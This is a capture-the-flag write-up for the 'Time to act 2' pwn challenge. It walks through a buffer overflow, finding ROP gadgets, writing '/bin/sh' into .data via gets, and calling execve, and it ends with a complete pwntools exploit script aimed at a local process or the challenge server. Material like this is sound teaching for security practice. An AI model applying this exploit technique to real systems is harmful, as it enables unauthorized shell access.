---
title: "Friendly Securinets ISI 2025 - Time to act 2"
date: 2025-11-16 03:10:00 +0100
categories: [friendly-isi-2025]
tags: [pwn, rop, writeup, securinets , isi , easy]
---

# [Time to act 2] Writeup

**Category:** [pwn]  
**Points:** [500]  
**Author:** hyzr  


## Tools Used

- `gdb` / `ropper` / `readelf` 
- `python3 (pwntools)` for exploit scripting  

---

## Analysis

- Let's run the basics commands **file and checksec** on the binary and see what we'll get :

![file and checksec output](https://media.discordapp.net/attachments/1439691535397552128/1439717769267646606/image.png?ex=691b8928&is=691a37a8&hm=35c31a2b51c1e67737639ca56a0cac6d7280eecbd2031655b59c12cb758bbae9&=&format=webp&quality=lossless&width=1872&height=475)


- RELRO is partial which means we can overwrite some regions of the binary with whatever we want  and this will be very helpful and make a lot of thing easier for us, and when i execute the binary this is what it outputs :

![binary output](https://media.discordapp.net/attachments/1439691535397552128/1439719046777147422/image.png?ex=691b8a59&is=691a38d9&hm=f81dc11e2a7e2a450c753275c75e616cf360bc32a2838f1ebe883044b3eab10b&=&format=webp&quality=lossless&width=1872&height=341)

- Let's quickly use gdb to see what we have and calculate the offset to **rip** just like we did in the previous task.

![info func output](https://media.discordapp.net/attachments/1439691535397552128/1439720434655428709/image.png?ex=691b8ba4&is=691a3a24&hm=f4ee8c8b49dbdea59ffbe65ad617cb559f9f16b95f80eaaa1a87f8a76151e2b7&=&format=webp&quality=lossless&width=1872&height=678)

![disassembly of vuln](https://media.discordapp.net/attachments/1439691535397552128/1439719971935490098/image.png?ex=691b8b36&is=691a39b6&hm=06b0dbc3fee8740c2742f5a6ee5dd5a259010e96c7c3d2c38c3230f9024cf127&=&format=webp&quality=lossless&width=1872&height=416)

![disassembly of vuln](https://media.discordapp.net/attachments/1439691535397552128/1439720878303613169/image.png?ex=691b8c0e&is=691a3a8e&hm=abb27d14114b52e5a20ff66894a98922a6001a733a46b471e745039443baaa46&=&format=webp&quality=lossless&width=1569&height=751)

![strings output](https://media.discordapp.net/attachments/1439691535397552128/1439721344429330602/image.png?ex=691b8c7d&is=691a3afd&hm=ea2edd8c6d015844283709e07d50009cd67d9d6d1f55a53d93f94195320f3177&=&format=webp&quality=lossless&width=1872&height=278)

- This challenge is exactly the same as the previous one ( time to act 1 ) with a small twist , instead of **system** we have **execve** and we don't directly have the string **/bin/sh** , and to spawn a shell using **execve** we need to call it like that **execve("/bin/sh" , 0 , 0);** so we need to set up the arguments using **rdi** = "/bin/sh" (we'll talk how to get it) , **both rsi and rdi = 0** , don't understand why these registers specifically ? do a bit of research about **System V AMD64 ABI x86_64** , i will extract the gadgets as follows , i always keep a ret gadget in case of a misalignment issue to align the stack :

![ropper output](https://media.discordapp.net/attachments/1439691535397552128/1439727688821510276/image.png?ex=691b9265&is=691a40e5&hm=fce738694dcb3ff6c2d16cf3c414bb6c030611fe08d46d20b9b24d19ed7511cc&=&format=webp&quality=lossless&width=1872&height=324)

![ropper output](https://media.discordapp.net/attachments/1439691535397552128/1439728007546802328/image.png?ex=691b92b1&is=691a4131&hm=0e1b7f2ad7fb6c742acc5e965a7fe35b03a25a8004410f3acd29e4b5876f99f6&=&format=webp&quality=lossless&width=1872&height=222)


- So when **RELRO is partial** we can write somewhere in the binary whatever we need wether it's a shellcode or a rop chain or even a simple string like "/bin/sh" usually in **.data or .bss sections** , let's see their addresses and if they have enough space or no ( > 7 bytes ) , we can see the elf sections with this command : **readelf -S ./main** :

![readelf output](https://media.discordapp.net/attachments/1439691535397552128/1439724558910230600/image.png?ex=691b8f7b&is=691a3dfb&hm=3b79b6cdf2084cb5f6ddcfb6be7062d6cf6d0ee349afae6fb4244e67e8cb774f&=&format=webp&quality=lossless&width=1618&height=751)

- Now we need to write somewhere they both fine but usually bss is safer bcz **.data** holds initialized variables (global / static ...) while **.bss** uninitialized variables and our program might have sensitive variables but in our case it dosent and they both works fine !
now using the function **gets** we will right there , **gets** takes input until it finds a newline **\n or EOF** so we dont have to worry about extra characters in the end :D .


## Exploitation / Solution

- now finally we can start writing the exploit script and this is what i ended up writing remember we are calling gets and writing what we'll later send to **execve** to spawn a shell so don't forget to write **/bin/sh** when **gets** is triggered , it worked locally and remotely :

```python

from pwn import *

p = process("./main")
#p = remote("4.233.145.123" , 12002)

data = 0x404028
execve = 0x4010b0
gets = 0x4010c0

pop_rdi_ret = 0x4011be
pop_rdx_ret = 0x4011c2
pop_rsi_ret = 0x4011c0
ret = 0x40101a

main_test = 0x40129d

pay = b"A"*0x108 + p64(pop_rdi_ret) + p64(data) +  p64(gets)
pay += p64(pop_rdi_ret) + p64(data) + p64(pop_rsi_ret) + p64(0) + p64(pop_rdx_ret) + p64(0) + p64(execve)

p.recvuntil(b">")
p.sendline(pay)
p.interactive()


```

- if we run it we get this :

![solver.py output](https://media.discordapp.net/attachments/1439691535397552128/1439729570206056538/image.png?ex=691b9426&is=691a42a6&hm=89ea797efcac68554cdcc1344a6080b0a584eb2211d0ea6335cb7264e865e6d6&=&format=webp&quality=lossless&width=1872&height=423)


- Thanks for reading hope this was helpful !
